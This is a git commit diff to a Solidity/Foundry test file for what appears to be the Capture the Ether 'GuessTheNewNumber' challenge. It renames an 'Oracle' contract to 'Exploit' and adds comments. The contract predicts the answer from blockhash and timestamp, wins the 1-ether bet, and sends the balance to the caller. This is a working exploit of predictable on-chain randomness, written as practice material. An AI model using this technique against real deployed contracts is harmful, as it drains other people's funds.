28a5ae513687a87183ce2a9cf565fd846301d525
0xcharlie <charlyfinos@gmail.com>
2023-02-28 00:09:44 -0300

    Add comments and rename contract

--- test/4.GuessTheNewNumber.t.sol
+++ test/4.GuessTheNewNumber.t.sol
@@ -4,7 +4,11 @@ pragma solidity ^0.8.13;
 import "forge-std/Test.sol";
 import "../src/4.GuessTheNewNumber.sol";
 
-contract Oracle {
+/*
+ * @dev Contract for exploting the GuessTheNewNumber contract
+ * @dev This exploit happens due to deterministic nature of the blockhash function
+ */
+contract Exploit {
     function getAnswer() public view returns (uint8) {
         return
             uint8(
@@ -19,15 +23,23 @@ contract Oracle {
             );
     }
 
+    /*
+    @params t - the target contract
+    @dev This function will call the guess function of the target contract
+    */
     function attack(GuessTheNewNumber t) external payable {
         t.guess{value: 1 ether}(getAnswer());
         payable(msg.sender).transfer(address(this).balance);
     }
 
+    /*
+    @notice This function is needed to receive the ether sent by the target contract
+    */
     receive() external payable {}
 }
 
 contract CounterTest is Test {
+    // @notice The target contract
     GuessTheNewNumber public target;
 
     address player = vm.addr(1);
@@ -42,8 +54,11 @@ contract CounterTest is Test {
     function testGuess() public {
         vm.startPrank(address(player));
 
-        Oracle exploit = new Oracle();
+        // Initialize the oracle contract
+        Exploit exploit = new Exploit();
 
+        // Call oracle contrac to explit the target contract
+        // @notice you can pass the answer as a parameter but the blockhash can be changed
         exploit.attack{value: 1 ether}(target);
 
         assertTrue(target.isComplete());
